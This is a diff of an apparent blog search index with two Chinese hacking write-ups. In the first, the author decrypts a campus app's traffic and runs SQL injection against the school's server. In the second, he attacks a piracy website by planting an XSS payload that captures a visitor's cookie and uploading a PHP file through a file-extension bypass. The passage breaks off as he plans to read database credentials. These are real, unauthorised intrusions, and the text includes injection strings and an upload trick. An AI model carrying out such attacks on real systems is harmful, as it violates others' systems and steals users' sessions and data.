@@ -881,6 +881,62 @@
       </tags>
   </entry>
   <entry>
+    <title>校园生活APP渗透记录</title>
+    <url>/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<p>最近使用校园生活这个APP给电动车充电，发现这个APP界面简陋，而且必须在校园网里才能连上服务器登录（外网环境无法使用，必须要拨VPN连进校园网才行）。最坑爹的是，这个APP并不支持iOS，必须用安卓手机才能安装，而我目前主力鸡是iPhone，之前的安卓机没有电话卡又不能上网，每次充电都必须带两个手机，iPhone开热点给安卓机联网，安卓机还要拨号VPN，着实麻烦，于是就想着有没有啥方法可以用iOS去控制充电。</p>
+<span id="more"></span>
+
+<p>正好前段时间渗透测试的课上说到以前有同学黑进了学校的邮件系统，想到一般情况下内部系统可能都没啥安全防护措施，就打算试一试，看看能不能分析一波登录和请求，然后再尝试搞个客户端或者Web端的。</p>
+<h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><p>首先想到的是用Burpsuite对这个APP的流量进行分析，看看能不能捡个漏，通过抓包的方法来找到URL或者API，如果是内嵌Web的就更方便了，如果不是的话搞下API也许也能搞得定。</p>
+<p>在模拟器里装好APP，设置代理到Burpsuite，开抓！</p>
+<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107160012091.png" alt="image-20201107160012091"></p>
+<p>发现登录请求是一个长成这样子的东西，看起来很像Base64编码后的数据，可是用Base64解码并没有看到有用的东西：</p>
+<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107160505582.png" alt="image-20201107160505582"></p>
+<p>好吧，到这一步只能盲猜是加密了，将加密后的Hex数据Base64编码。</p>
+<h2 id="逆向APK"><a href="#逆向APK" class="headerlink" title="逆向APK"></a>逆向APK</h2><p>既然是APK的安装包，那么逆一下去看看加密算法也很合理吧。</p>
+<p>在分析之前先看看请求有啥特点，当点击比如”我的账单“的选项的时候，发出去的请求虽然是加密的，但是内容并没有变化，那就可能是对称加密，大概率是ECB模式，没有加盐，没有iv的变化，所以才能明文不变的时候密文也不变。</p>
+<p>为了图省事，直接用dex2jar把class文件转成jar，然后用jd_gui来查看。</p>
+<p>原本想着是不是会有加壳、混淆啥的，对反编译并不抱很大的希望，结果拖进去一看，完全没有任何处理，整个程序的结构非常清晰，简直可以作为安卓逆向的新手入门范例了！那正好，也省的去折腾frida之类的方法了。</p>
+<p>首先找到与程序包名对应的包，如这里的<code>com.xxx.xxxlife</code>，发现一堆的Activity，一般来说登录和密码找回这两个部分的界面内容是最简单的，这里找到了login的Activity：</p>
+<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107162214893.png" alt="image-20201107162214893"></p>
+<p>找这个Activity的目的是看看有没有发送请求的部分，毕竟它在发送之前是要先加密之后再发出去的嘛。</p>
+<p>果不其然发现了这个<code>DataUtils.login</code>，这里就是发送登录请求的核心部分。果断单击函数名跟踪过去。</p>
+<p>这个函数里面就是简单的对输入参数进行了拼装，合成一个json字符串，然后调用<code>sendRequest</code>函数将参数发送出去。那么这个<code>sendRequest</code>函数里面一定暗藏玄机。</p>
+<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107162530278.png" alt="image-20201107162530278"></p>
+<p>果不其然，在构建POST请求的时候，对其中的参数部分进行了加密处理，调用了<code>DES.encryptDES</code>函数。继续跟踪：</p>
+<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107162704233.png" alt="image-20201107162704233"></p>
+<p>这里简直毫无悬念，密钥、iv全部暴露出来，使用DES CBC的加密方式，5Padding的填充。</p>
+<p>这样一来，通信的加解密就算全搞定了，再回去看看登录的部分，没有Cookie，没有Session，全靠数据里面的UserID……咦？？是不是说我去修改一下Shared_Perference里的数据就可以……花别人的钱了？？？</p>
+<h2 id="用Python验证一下"><a href="#用Python验证一下" class="headerlink" title="用Python验证一下"></a>用Python验证一下</h2><p>对于这个加解密，尝试用Python验证一下。这里我用的是Python3环境（毕竟2.x已经被放弃了呢），pyDes的库。这里因为数据都是JSON格式进行封装，然后再加密，再Base64，所以代码也尝试加了JSON的格式化等，来适应这个系统的数据传输。</p>
+<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107163517509.png" alt="image-20201107163517509"></p>
+<p>加了控制选项，这样可以更方便的控制是否需要编码/解码。效果如下：</p>
+<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107163638469.png" alt="image-20201107163638469"></p>
+<p>成功解密~</p>
+<p>如果只是想看看数据，可以用Frida/Objection来Hook加解密函数，可能会更方便，配合脚本什么的还能直接调用sendRequest函数，应该会更爽，不过这里懒得折腾就没进一步去搞了。</p>
+<h2 id="手贱的”更进一步“"><a href="#手贱的”更进一步“" class="headerlink" title="手贱的”更进一步“"></a>手贱的”更进一步“</h2><p>到这里本来不想搞了，结果忽然想到”要不要试一下SQL注入呢“。</p>
+<p>上面那个解出来的请求是请求用户信息（accountinfo），下面的userid是当前用户的id，一串纯数字。第一个想到就是有没有数字型的注入，于是输入了<code>or 1=1</code>，结果，返回了一个巨大的Response：</p>
+<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107164222145.png" alt="image-20201107164222145"></p>
+<p>好吧，我觉得我好像成功了？</p>
+<p>每次用脚本加密、再解密数据实在不方便，于是就在上面的Python代码的基础上加了个<code>Requests</code>库，将用户输入的内容自动加密POST发出去，再解密接收到的数据……</p>
+<p>先通过<code>order by 1</code>这样的语句确定当前返回值一共有几列，然后就常规的<code>union select</code>带出数据：</p>
+<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107164520544.png" alt="image-20201107164520544"></p>
+<p>从结果中可以看出是一个SQLSERVER 2008的数据库：</p>
+<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107164604246.png" alt="image-20201107164604246"></p>
+<p>发现SQLServer的数据库平时遇到的太少了，基本都是MySQL的多，而且想想作为探索来说这么多已经远远超过开始想做的事情了，就不再继续搞下去了吧。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过简单的对这个APP进行了一波分析，发现了一些问题：</p>
+<p>1、密钥信息硬编码</p>
+<p>2、服务端没有有效的身份校验（缺少Cookie等身份验证机制）</p>
+<p>3、存在水平越权（修改userid可以查看其他人的信息）</p>
+<p>4、服务端存在SQL注入</p>
+<p>5、可能存在反序列化的问题（毕竟是JSON数据，这个部分没有验证）</p>
+<p>最后，虽然是校园内部使用的APP，安全性也非常重要，如果被不坏好意的人利用了，不仅仅是我们这些学生的信息遭受损失，系统里的充值信息甚至金钱可能都会遭受损失。</p>
+]]></content>
+      <tags>
+        <tag>Android</tag>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>绕过群晖限制修改HTTP头</title>
     <url>/2021/02/20/%E7%BB%95%E8%BF%87%E7%BE%A4%E6%99%96%E9%99%90%E5%88%B6%E4%BF%AE%E6%94%B9HTTP%E5%A4%B4/</url>
     <content><![CDATA[<p>这个故事要从我折腾群晖的免密分享视频开始说起……</p>
@@ -955,59 +1011,152 @@
       </tags>
   </entry>
   <entry>
-    <title>校园生活APP渗透记录</title>
-    <url>/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<p>最近使用校园生活这个APP给电动车充电，发现这个APP界面简陋，而且必须在校园网里才能连上服务器登录（外网环境无法使用，必须要拨VPN连进校园网才行）。最坑爹的是，这个APP并不支持iOS，必须用安卓手机才能安装，而我目前主力鸡是iPhone，之前的安卓机没有电话卡又不能上网，每次充电都必须带两个手机，iPhone开热点给安卓机联网，安卓机还要拨号VPN，着实麻烦，于是就想着有没有啥方法可以用iOS去控制充电。</p>
+    <title>被伪装成“知识付费”的盗版网站坑了钱之后……</title>
+    <url>/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/</url>
+    <content><![CDATA[<p>最近迷上了评书，听了一个片段之后很想找到全集把故事听完，于是在网上搜索。找到了一个貌似资源很全的网站，但是“知识付费”时代，必须充会员才能获取真实的下载地址。由于找了很久都没找到这段评书的资源，于是也没多想，充了12元买了这个资源。</p>
 <span id="more"></span>
 
-<p>正好前段时间渗透测试的课上说到以前有同学黑进了学校的邮件系统，想到一般情况下内部系统可能都没啥安全防护措施，就打算试一试，看看能不能分析一波登录和请求，然后再尝试搞个客户端或者Web端的。</p>
-<h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><p>首先想到的是用Burpsuite对这个APP的流量进行分析，看看能不能捡个漏，通过抓包的方法来找到URL或者API，如果是内嵌Web的就更方便了，如果不是的话搞下API也许也能搞得定。</p>
-<p>在模拟器里装好APP，设置代理到Burpsuite，开抓！</p>
-<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107160012091.png" alt="image-20201107160012091"></p>
-<p>发现登录请求是一个长成这样子的东西，看起来很像Base64编码后的数据，可是用Base64解码并没有看到有用的东西：</p>
-<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107160505582.png" alt="image-20201107160505582"></p>
-<p>好吧，到这一步只能盲猜是加密了，将加密后的Hex数据Base64编码。</p>
-<h2 id="逆向APK"><a href="#逆向APK" class="headerlink" title="逆向APK"></a>逆向APK</h2><p>既然是APK的安装包，那么逆一下去看看加密算法也很合理吧。</p>
-<p>在分析之前先看看请求有啥特点，当点击比如”我的账单“的选项的时候，发出去的请求虽然是加密的，但是内容并没有变化，那就可能是对称加密，大概率是ECB模式，没有加盐，没有iv的变化，所以才能明文不变的时候密文也不变。</p>
-<p>为了图省事，直接用dex2jar把class文件转成jar，然后用jd_gui来查看。</p>
-<p>原本想着是不是会有加壳、混淆啥的，对反编译并不抱很大的希望，结果拖进去一看，完全没有任何处理，整个程序的结构非常清晰，简直可以作为安卓逆向的新手入门范例了！那正好，也省的去折腾frida之类的方法了。</p>
-<p>首先找到与程序包名对应的包，如这里的<code>com.xxx.xxxlife</code>，发现一堆的Activity，一般来说登录和密码找回这两个部分的界面内容是最简单的，这里找到了login的Activity：</p>
-<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107162214893.png" alt="image-20201107162214893"></p>
-<p>找这个Activity的目的是看看有没有发送请求的部分，毕竟它在发送之前是要先加密之后再发出去的嘛。</p>
-<p>果不其然发现了这个<code>DataUtils.login</code>，这里就是发送登录请求的核心部分。果断单击函数名跟踪过去。</p>
-<p>这个函数里面就是简单的对输入参数进行了拼装，合成一个json字符串，然后调用<code>sendRequest</code>函数将参数发送出去。那么这个<code>sendRequest</code>函数里面一定暗藏玄机。</p>
-<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107162530278.png" alt="image-20201107162530278"></p>
-<p>果不其然，在构建POST请求的时候，对其中的参数部分进行了加密处理，调用了<code>DES.encryptDES</code>函数。继续跟踪：</p>
-<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107162704233.png" alt="image-20201107162704233"></p>
-<p>这里简直毫无悬念，密钥、iv全部暴露出来，使用DES CBC的加密方式，5Padding的填充。</p>
-<p>这样一来，通信的加解密就算全搞定了，再回去看看登录的部分，没有Cookie，没有Session，全靠数据里面的UserID……咦？？是不是说我去修改一下Shared_Perference里的数据就可以……花别人的钱了？？？</p>
-<h2 id="用Python验证一下"><a href="#用Python验证一下" class="headerlink" title="用Python验证一下"></a>用Python验证一下</h2><p>对于这个加解密，尝试用Python验证一下。这里我用的是Python3环境（毕竟2.x已经被放弃了呢），pyDes的库。这里因为数据都是JSON格式进行封装，然后再加密，再Base64，所以代码也尝试加了JSON的格式化等，来适应这个系统的数据传输。</p>
-<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107163517509.png" alt="image-20201107163517509"></p>
-<p>加了控制选项，这样可以更方便的控制是否需要编码/解码。效果如下：</p>
-<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107163638469.png" alt="image-20201107163638469"></p>
-<p>成功解密~</p>
-<p>如果只是想看看数据，可以用Frida/Objection来Hook加解密函数，可能会更方便，配合脚本什么的还能直接调用sendRequest函数，应该会更爽，不过这里懒得折腾就没进一步去搞了。</p>
-<h2 id="手贱的”更进一步“"><a href="#手贱的”更进一步“" class="headerlink" title="手贱的”更进一步“"></a>手贱的”更进一步“</h2><p>到这里本来不想搞了，结果忽然想到”要不要试一下SQL注入呢“。</p>
-<p>上面那个解出来的请求是请求用户信息（accountinfo），下面的userid是当前用户的id，一串纯数字。第一个想到就是有没有数字型的注入，于是输入了<code>or 1=1</code>，结果，返回了一个巨大的Response：</p>
-<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107164222145.png" alt="image-20201107164222145"></p>
-<p>好吧，我觉得我好像成功了？</p>
-<p>每次用脚本加密、再解密数据实在不方便，于是就在上面的Python代码的基础上加了个<code>Requests</code>库，将用户输入的内容自动加密POST发出去，再解密接收到的数据……</p>
-<p>先通过<code>order by 1</code>这样的语句确定当前返回值一共有几列，然后就常规的<code>union select</code>带出数据：</p>
-<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107164520544.png" alt="image-20201107164520544"></p>
-<p>从结果中可以看出是一个SQLSERVER 2008的数据库：</p>
-<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107164604246.png" alt="image-20201107164604246"></p>
-<p>发现SQLServer的数据库平时遇到的太少了，基本都是MySQL的多，而且想想作为探索来说这么多已经远远超过开始想做的事情了，就不再继续搞下去了吧。</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过简单的对这个APP进行了一波分析，发现了一些问题：</p>
-<p>1、密钥信息硬编码</p>
-<p>2、服务端没有有效的身份校验（缺少Cookie等身份验证机制）</p>
-<p>3、存在水平越权（修改userid可以查看其他人的信息）</p>
-<p>4、服务端存在SQL注入</p>
-<p>5、可能存在反序列化的问题（毕竟是JSON数据，这个部分没有验证）</p>
-<p>最后，虽然是校园内部使用的APP，安全性也非常重要，如果被不坏好意的人利用了，不仅仅是我们这些学生的信息遭受损失，系统里的充值信息甚至金钱可能都会遭受损失。</p>
+<p>但是充完之后发现想要的资源下载链接是一个百度云，资源已经失效了，于是想找找反馈的入口。结果仔细一看才发现，这个网站非常不正规，虽然是通过QQ登录，但是一般网站会有独立的账号体系，而这个网站不能修改用户的信息，看起来就像是没完工的测试项目似的。</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806160535564.png" alt="image-20200806160535564"></p>
+<p>而且网站中的资源非常博杂，从相声戏曲，到新媒体运营，再到编程、软件，简直应有尽有，而且全是百度云的资源，看起来像是收集的盗版的东西。大部分的资源页面包括首页推荐的热门资源中都没有任何留言，就像一幢豪华CBD大厦里面空无一人，显得异常诡异。</p>
+<p>查看页面的过程中，只看到了一个站长的联系QQ，加过之后也没反应。那既然这样，还是靠自己一探究竟吧。</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>俗话说知己知彼，百战不殆。在正式开始之前先收集一下目标站点的信息。不同于正规的渗透测试，目标就是这个网站，因此就从服务器IP、开放端口、域名、接口这些信息下手。</p>
+<h3 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h3><p>首先通过域名，反查它的IP地址以及子域名信息。这里子域名查询没有啥结果，也和预想的差不多，一个坑钱的小网站应该也不会有什么其他子域。</p>
+<p>这里用了Chrome的插件 hacker target 来进行简单查询：</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806163057871.png" alt="image-20200806163057871"></p>
+<h3 id="端口信息"><a href="#端口信息" class="headerlink" title="端口信息"></a>端口信息</h3><p>拿到了IP地址，利用shodan初步看看开放了什么端口：</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806162913629.png" alt="image-20200806162913629"></p>
+<p>好家伙，有22还有3306？不过shodan向来都不太准，再用其他的工具确认一下。</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806163328543.png" alt="image-20200806163328543"></p>
+<p>这回发现多了个21，却没有3306了。那最后再用本机的nmap确认一下端口。</p>
+<p>因为直接跑nmap 65535个端口时间太长，而且很容易被云厂商认为是扫描行为而封禁IP，所以可以用这种外围打探的方式先确定基本的端口，最后再用nmap指定端口来确定是否真的开放了。</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806164804389.png" alt="image-20200806164804389"></p>
+<p>那么目前能确定的开放端口就是这些。</p>
+<h3 id="组件信息"><a href="#组件信息" class="headerlink" title="组件信息"></a>组件信息</h3><p>对于开放的端口，简单识别一下，其中<code>21 - FTP</code>, <code>22 - SSH</code>, <code>80,443 - HTTP(S)</code>, <code>3306 - MySQL</code>，那剩下的8888是什么？访问一下界面，从内容看应该是宝塔面板的登录接口，但是做了相应的安全设置。</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806200632061.png" alt="image-20200806200632061"></p>
+<p>回到HTTP(S)服务上来，先尝试用在线CMS识别，发现无法识别出使用的CMS，只知道用的是PHP：</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806201506225.png" alt="image-20200806201506225"></p>
+<p>再看robots.txt文件，也没什么发现：</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806201628384.png" alt="image-20200806201628384"></p>
+<p>那么目前判断很有可能就是自己开发的系统。而2020年用PHP开发系统，至少是基于某个框架的，因此寻找一下有没有使用框架的蛛丝马迹。很快，在未登录状态下点击发帖按钮有个登录跳转（这部分在下文详细说如何发现的）：</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806201941920.png" alt="image-20200806201941920"></p>
+<p>咦？这熟悉的 :( 很想是thinkphp呀！</p>
+<p>至此，简单的目标信息收集就结束了，总结如下：</p>
+<p>目标域名：<a href="http://www.xxx.net/">www.xxx.net</a></p>
+<p>子域名：无</p>
+<p>目标IP：3x.xx.xx.x1</p>
+<p>开放端口：21，22，80，443，3306，8888</p>
+<p>CMS信息：暂无</p>
+<p>使用语言：PHP</p>
+<p>使用框架：ThinkPHP（目前版本未知）</p>
+<p>部署环境：宝塔Linux面板</p>
+<h2 id="威胁建模-漏洞分析"><a href="#威胁建模-漏洞分析" class="headerlink" title="威胁建模/漏洞分析"></a>威胁建模/漏洞分析</h2><p>由于是纯黑盒测试，因此不可能有完整的威胁建模进行漏洞分析，只能根据前期收集的信息结合挖洞的过程来慢慢进行威胁建模的部分，因此这两块是合在一起进行的。</p>
+<p>首先根据信息收集的内容，可以知道21和22两个端口大概率是宝塔面板提供的，为了方便用户对网站进行管理。因此这里就不去尝试暴力破解了（印象中宝塔是不允许设置弱密码的），如果Web应用的部分无法突破再考虑端口的暴力破解。同理3306也是这样。</p>
+<p>8888端口是宝塔的控制面板，因为安全策略无法直接使用。因此将注意力放在443端口的Web Appication上。</p>
+<h3 id="HTML-JS分析"><a href="#HTML-JS分析" class="headerlink" title="HTML/JS分析"></a>HTML/JS分析</h3><p>很多情况下，在HTML源码和JS脚本中可能会隐藏诸多秘密，尤其是在目前前端开发喜欢用VUE.js，网站的页面路径很多都会在JS里暴露。</p>
+<p>首先先看首页的HTML源码以及加载的非第三方JS代码。在首页的HTML源码中，发现了一段被注释掉的导航栏代码：</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806205311823.png" alt="image-20200806205311823"></p>
+<p>试一下<code>/taolun</code>，看看还有没有这个页面：</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806205618250.png" alt="image-20200806205618250"></p>
+<p>看到这个讨论区，很多都是在吐槽链接失效、资源付费后没用的帖子，难怪要把这个导航栏给注释掉！</p>
+<p>在页面右下角有一个发新帖的按钮，由于是未登录状态，因此点击之后弹出跳转登录的错误页面（即信息收集里看到的 :( 的页面），确定目标使用的框架是Thinkphp。</p>
+<p>看了其他页面的HTML和JS，没有其他有价值的内容了。</p>
+<h3 id="ThinkPHP已知漏洞"><a href="#ThinkPHP已知漏洞" class="headerlink" title="ThinkPHP已知漏洞"></a>ThinkPHP已知漏洞</h3><p>既然确定了框架是TP，那么可以试试已知漏洞，万一有呢~</p>
+<p>可以利用<a href="https://github.com/theLSA/tp5-getshell/%E5%B7%A5%E5%85%B7%E6%9D%A5%E6%96%B9%E4%BE%BF%E7%9A%84%E8%BF%9B%E8%A1%8C%E6%A3%80%E6%B5%8B%E3%80%82">https://github.com/theLSA/tp5-getshell/工具来方便的进行检测。</a></p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806211806612.png" alt="image-20200806211806612"></p>
+<p>这里显示三个PoC均为404，可能是路由配置与默认有差距。这里可以执行其他的用例，比如_method变量覆盖漏洞（可参考<a href="https://www.cnblogs.com/WindrunnerMax/p/12558256.html">《ThinkPHP5.0 漏洞测试》</a>）：</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806212306138.png" alt="image-20200806212306138"></p>
+<p>这里成功让系统报错，再次确认确实是TP的框架，版本V5.0.0，以及绝对路径等等，这里就不再详细展示。</p>
+<p>测试了其他的已知漏洞，都未能成功触发，此路不通。</p>
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>因为用的是TP的框架，因此这里实际上也算是已知漏洞的验证了。因为TP自带防护，而且测试了几个点发现SQL防护应该是打开的，而某些注入是需要特定条件（比如把input变量直接转成数组），因为没有源码，试了几个点都没成功就放弃了&gt;.&lt; …</p>
+<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>XSS在这里其实没太大作用，整个网站都没找到有与后台的联系，比如问题反馈什么的，不确定管理员是否会去查看，不过抱着试一试的心情，开始找输入点。</p>
+<p>依然还是在<code>/taolun</code>的页面下，找了个帖子进去，发现可以回帖。本着先试试水的心态，复制了这个帖子的标题进去，发现竟然编辑器支持样式！</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806213651303.png" alt="image-20200806213651303"></p>
+<p>那这就说明，很有可能这个接口根本不会对输入进行过滤！</p>
+<p>迅速打开XSS平台，将代码复制下来，用Burpsuite拦住消息，在结尾插入代码，搞定！</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806214055993.png" alt="image-20200806214055993"></p>
+<p>先试试我自己：</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806214330841.png" alt="image-20200806214330841"></p>
+<p>成功读到了我的Cookie。</p>
+<p>但是因为并没有注意邮件，实际上很快就有人看了这个帖子触发了XSS，但等我看到的时候已经失效了……</p>
+<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>因为XSS的成功，我判断目标站点应该是除了框架默认的安全配置之外并没有进行额外的安全加固。在“发新帖”的部分，允许用户在帖子里上传图片：</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806215141784.png" alt="image-20200806215141784"></p>
+<p>这就给了我机会了。先试试简单的，编辑一个文本文件，内容是</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo();</span><br></pre></td></tr></table></figure>
+
+<p>文件名保存成<code>1.jpg</code>。上传的时候用Burp将filename的后缀改成.php：</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806222704821.png" alt="image-20200806222704821"></p>
+<p>浏览器访问成功：</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806222905548.png" alt="image-20200806222905548"></p>
+<p>利用这个页面，正好查看一下disable_functions的情况：</p>
+<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806222955099.png" alt="image-20200806222955099"></p>
+<p>这里可以看到，应该是宝塔面板的设置，在配置里将所有可能命令执行的函数全部都禁用了，因此上传Webshell也没什么意义，没法用菜刀或者AntSword进行连接。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>上面的步骤试探到文件上传，就已经找到了相应的方法可以进行利用了。本来的想法是通过文件上传进行反弹Shell，进一步提权进行后渗透的步骤，但是这里因为<code>disable_functions</code>卡住，需要绕过。</p>
+<p>在实施绕过这个步骤之前，可以考虑先利用一下3306端口。之前发现3306是开放的，目前又可以上传PHP源码，可以写一个读取文件的PHP代码，将TP的database.php读出来，获取到数据库用户名和密码从而进行连接。</p>
+<p>同时，为了保证之前的phpinfo页面不被其他人发现，写了一个删除文件功能（如果后面不用了还能把上传的这些PHP都删了）：</p>
